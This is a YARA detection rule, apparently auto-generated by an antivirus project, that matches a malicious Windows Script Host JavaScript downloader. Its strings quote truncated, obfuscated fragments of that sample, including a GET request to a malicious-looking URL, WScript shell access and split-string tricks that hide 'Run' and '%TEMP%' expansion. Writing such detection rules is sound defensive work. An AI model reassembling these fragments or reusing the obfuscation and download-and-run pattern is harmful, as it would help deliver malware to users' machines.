rule sig_20160428_903d6818a1f698048ae36ca1bda9f66e {
  meta:
    description = "datamaliciousorder - file 20160428_903d6818a1f698048ae36ca1bda9f66e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2a3b813611fd9e0fcd9163e86ca1fae5104ec1dd53de7645062af3826fe1d2e6"

  strings:
    $s1  = "RucGxkCsdQqmRhfNwmVyq[XwrKjsEskVspEegHliTvw](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "return UksNnhAkrHowZhaHkzTpq - DljBuwWvwDkaIkyCggJtl;};" fullword ascii
    $s3  = "function RjxJrrLnoYwkSjhPveWuc(UksNnhAkrHowZhaHkzTpq, DljBuwWvwDkaIkyCggJtl){GfuZpiRwcGftDwpQmeQzk = GfuZpiRwcGftDwpQmeQzk * 1; " ascii
    $s4  = "var PmeUgcQorXmmTmfEiqLgq = this[\"WScript\"];" fullword ascii
    $s5  = "function IrsUdhGznGyxMhjRtuBia(LkrYtbUzsAkpLkoScxIij){VpzYacAiaXggJdbSkuPfy[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s6  = "function RtyYkbJrxVwyRwoSykUoc() {return VpzYacAiaXggJdbSkuPfy[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s7  = "function IrsUdhGznGyxMhjRtuBia(LkrYtbUzsAkpLkoScxIij){VpzYacAiaXggJdbSkuPfy[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s8  = "var VpzYacAiaXggJdbSkuPfy = function TeiAvgAbqYlkGvmEzqBdt() {return PmeUgcQorXmmTmfEiqLgq[CldAdcByxPisXmrPzzXxn](\"WScript\"+\"" ascii
    $s9  = "if (RucGxkCsdQqmRhfNwmVyq[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function RjxJrrLnoYwkSjhPveWuc(UksNnhAkrHowZhaHkzTpq, DljBuwWvwDkaIkyCggJtl){GfuZpiRwcGftDwpQmeQzk = GfuZpiRwcGftDwpQmeQzk * 1; " ascii
    $s11 = "function UczDfiFzrBmvKqkWyzVmd() {return ((GsdTtpGzmWvqYkvSrcUkp == true) && (GsdTtpGzmWvqYkvSrcUkp == VtiLnwKypDzdAvgFfpMbw)) ?" ascii
    $s12 = "function UczDfiFzrBmvKqkWyzVmd() {return ((GsdTtpGzmWvqYkvSrcUkp == true) && (GsdTtpGzmWvqYkvSrcUkp == VtiLnwKypDzdAvgFfpMbw)) ?" ascii
    $s13 = "var VpzYacAiaXggJdbSkuPfy = function TeiAvgAbqYlkGvmEzqBdt() {return PmeUgcQorXmmTmfEiqLgq[CldAdcByxPisXmrPzzXxn](\"WScript\"+\"" ascii
    $s14 = "function RtyYkbJrxVwyRwoSykUoc() {return VpzYacAiaXggJdbSkuPfy[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s15 = "var GsdTtpGzmWvqYkvSrcUkp = false;" fullword ascii
    $s16 = "var SbjCojZlhFzaNqqUrjVby = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "function KakOuvHceMzrKieZhmIgn(XmlXitSzdXqtPxfJdzRwl) {var KsyJufVdtJvvOkfMfaEmp = (1, 2, 3, 4, 5, XmlXitSzdXqtPxfJdzRwl); retur" ascii
    $s18 = "XiaFlvWqeDwtLcxPawPzk = true;" fullword ascii
    $s19 = "function UymBrwEurQeoVscLrrJon(){return 23;};" fullword ascii
    $s20 = "function LbbDqkVkqOftVmsQbaSpw(){return CldAdcByxPisXmrPzzXxn;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}